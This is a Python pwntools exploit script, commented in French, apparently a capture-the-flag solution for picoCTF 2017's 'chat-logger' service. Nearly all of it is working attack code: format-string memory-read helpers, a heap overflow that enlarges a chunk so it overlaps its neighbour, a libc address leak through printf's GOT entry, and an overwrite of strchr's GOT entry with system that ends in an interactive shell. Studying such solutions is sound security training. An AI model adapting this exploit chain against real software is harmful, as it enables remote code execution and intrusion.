#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='chat-logger'

if ((len(sys.argv)>1) and (sys.argv[1]=="1")):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59994
elif ((len(sys.argv)>1) and (sys.argv[1]=="2")):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59995
else:
    elf=ELF(binaire)
    libc=ELF('libc-chall.so.6')
    host='shell2017.picoctf.com'
    port=12012

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=0

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))


############


def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[0:8])


def lireptroffset(i):
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    b=p.recvuntil("Password: ")
    return(b[:b.index(" is incorrect")])


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=p.recvuntil("Password: ")
    fin=b.index(" is incorrect")
    return(b[4:fin])

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)

def tronque(s):
    i=len(s)-1
    while(i>=0) and (s[i]=="\x00"):
        i=i-1
    return(s[0:i+1])


p=remote(host,port)
def fin():
    return(p.recvuntil("> "))

def findb():
    time.sleep(0.1)
    return(p.recv(1024))


def docmd(c,b=0):
    print c
    p.sendline(c)
    if (b==0):
        return(fin())
    else:
        return(findb())


def list(l):
    return (docmd("chat "+str(l)))

def find(n,t):
    return (docmd("find "+str(n)+" "+t))

def edit(n,t,b=0):
    return (docmd("edit "+str(n)+" "+t,b))

def add(n,t):
    return (docmd("add "+str(n)+" "+t))

lettre=ord('a')

def nom(s):
    global lettre
    r = chr(lettre)*s
    lettre=lettre+1
    return(r)

# taille 22 -> bloc 0x30
# taille 21 -> bloc 0x20
# donc (taille+11)  +((16 - (taille + 11))%16)

def taille(s):
    t=(s+11)
    return(t+((16-(t%16)) % 16))
fin()
# on se place
pdebug(find(2, "conversation?"))
# on démarre pas de la reference
add(1,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
add(2,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
# on libèere un bloc de 0x20 qu'on déplace
find(2, "Only")
edit(3,"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
# on fabrique un peit texte
find(2,"conversation")
add(2,"zzzz")
find(2,"AAAAAAAAAAAAAAAAA")
edit(4,"A"*(6+3*8+6)+"q")
find(2,"xxxx")
# à ce stade on a modifié la longueur du bloc xxxxx et on peut recouvrir le bloc suivant
# fuite libc
reference_libc='printf'
pdebug(edit(3,"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"+"yy"+"yyyyyyyy"*4+tronque(p64(elf.got[reference_libc]))))
b=list(2)
b=b[b.index('407277433 ')+10:b.index('407277433 ')+16]
b=b+"\x00"*(8-len(b))
adr_reference_libc=bword(b)
print "[+] Ok, fuites libc trouvées"
whatis(reference_libc)
whatis('system')
cible='strchr'
pdebug(edit(3,"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"+"yy"+"yyyyyyyy"*4+tronque(p64(elf.got[cible]-8))))
b=list(2)
b=b[b.index('407277433 ')+10:b.index('407277433 ')+16]
pdebug(find(2,b[4:]))
b=b+"\x00"*(8-len(b))
print '[+] '+cible+' (',hex(elf.got[cible]),') -> ',hex(tolibc('system'))
pdebug(edit(1,tronque("aaaa"+p64(tolibc('system')))))
p.interactive()

'''
pdebug(find(2, "conversation?"))
pdebug(add(255,"000000000000000000000000000000000000000000000000000000000000000000"))
pdebug(find(2, "conversation?"))
pdebug(edit(10,"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"))
pdebug(find(2,"Quote"))
pdebug(edit(123,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
pdebug(add (27,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"))
pdebug(add (5 ,"CCC"))
pdebug(find(2,"BBBBB"))
pdebug(edit(23,"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"))
pdebug(find(2,"00000000000000000"))
#                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
pdebug(edit(123,"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\xa1"))
pdebug(find(2,"AAAAAAAAAAAAAA"))
raw_input()
pdebug(edit(12,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaadddddddddddddddddddddadd1"))

pdebug(list(2))
'''

p.close()
